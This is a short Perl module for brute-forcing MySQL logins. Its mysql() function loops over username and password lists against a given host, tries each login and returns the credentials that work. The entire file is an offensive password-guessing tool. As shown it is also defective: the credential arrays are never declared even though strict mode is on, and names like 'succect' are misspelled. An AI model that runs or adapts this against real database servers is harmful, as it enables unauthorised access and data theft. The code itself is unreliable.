package Secrity::bruteforcer::mysql;

use BMYSQL;
use strict;
use warnings;

our $VERSION = '0.01';
my $DEBUG = 0;

our @ISA    = qw(Exporter);
our @EXPORT = qw(mysql);
sub mysql {

    my ($host) = @_;
    my $result;

    for (@usrs) {
        my $user = $_;
        for (@pws) {
            my $pwd = $_;
            $pwd =~ s/\{user\}/$user/g if /\{user\}/;

            my $bmysql = BMYSQL->new(
                hostname => $host,
                debug    => $DEBUG,
            ) or return;

            $bmysql->login( $user, $pwd );
            if ( $bmysql->get_succect ) {
                if ($DEBUG) {
                    print "succect!\n";
                    print $_ , " => ", $bmysql->{$_}, "\n"
                      for ( keys %{$bmysql} );
                }
                $result .=
                  $bmysql->{'user'} . " " . $bmysql->{'password'} . "\n";
                last;
            }
        }
    }
    return $result;
}
